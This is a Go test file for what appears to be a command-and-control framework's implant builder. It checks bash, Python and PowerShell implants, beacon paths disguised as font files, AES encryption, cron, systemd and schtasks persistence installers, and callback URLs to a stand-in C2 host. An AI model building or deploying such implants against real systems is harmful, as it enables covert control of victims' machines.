package c2

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func TestImplantFileName(t *testing.T) {
	cases := map[string]string{"bash": "implant.sh", "python3": "implant.py", "powershell": "implant.ps1"}
	for rt, want := range cases {
		if got := implantFileName(rt); got != want {
			t.Errorf("runtime %s: got %s want %s", rt, got, want)
		}
	}
}

func TestWriteImplantFilesAllRuntimes(t *testing.T) {
	m := newTestManager(t)
	cases := []BuildOpts{
		{Runtime: "bash", Label: "b", BeaconPath: "assets/font.css", RespPath: "assets/glyph.bin"},
		{Runtime: "python3", Label: "p"},
		{Platform: "windows", Runtime: "powershell", Label: "w", Encrypt: "aes"},
	}
	for _, o := range cases {
		im, err := m.BuildImplant(o)
		if err != nil {
			t.Fatalf("build %+v: %v", o, err)
		}
		data, err := os.ReadFile(filepath.Join(m.BuildDir(im.ID), implantFileName(im.Runtime)))
		if err != nil {
			t.Fatalf("read implant: %v", err)
		}
		script := string(data)
		for _, want := range []string{im.ID, im.Token, im.BeaconPath, im.RespPath, im.BaseURL} {
			if !strings.Contains(script, want) {
				t.Errorf("%s: missing %q", im.Runtime, want)
			}
		}
		if strings.Contains(script, "{{") {
			t.Errorf("%s: unfilled placeholder in script", im.Runtime)
		}
		// AES key derivation must be present when encrypt=aes.
		if im.Encrypt == "aes" && !strings.Contains(script, "behemoth-c2:") {
			t.Errorf("%s: aes key material missing", im.Runtime)
		}
		// Installers exist and carry the id.
		for _, p := range []string{"none", "systemd", "cron", "schtasks"} {
			fn := filepath.Join(m.BuildDir(im.ID), installFileName(im.Platform, p))
			if _, err := os.Stat(fn); err != nil {
				continue // platform-inappropriate installers are skipped
			}
			b, err := os.ReadFile(fn)
			if err != nil {
				t.Fatalf("read installer: %v", err)
			}
			if !strings.Contains(string(b), im.ID) {
				t.Errorf("installer %s missing id", fn)
			}
		}
	}
}

func TestInstallCommand(t *testing.T) {
	m := newTestManager(t)
	im, _ := m.BuildImplant(BuildOpts{})
	got := InstallCommand(im, "none", "/tmp/")
	if !strings.Contains(got, "cd /tmp") || !strings.Contains(got, "install-none.sh") {
		t.Fatalf("linux install cmd: %q", got)
	}
	win, _ := m.BuildImplant(BuildOpts{Platform: "windows"})
	gotWin := InstallCommand(win, "schtasks", `C:\tmp`)
	if !strings.Contains(gotWin, `C:\tmp\install-schtasks.ps1`) {
		t.Fatalf("windows install cmd: %q", gotWin)
	}
}

func TestCallbackURLs(t *testing.T) {
	im := &Implant{BeaconPath: "update", RespPath: "response"}
	if got := CallbackURL(im, "https://c2.example.com/"); got != "https://c2.example.com/api/c2/update" {
		t.Fatalf("callback: %s", got)
	}
	if got := ResultURL(im, ""); got != "https://C2_HOST/api/c2/response" {
		t.Fatalf("result placeholder: %s", got)
	}
}
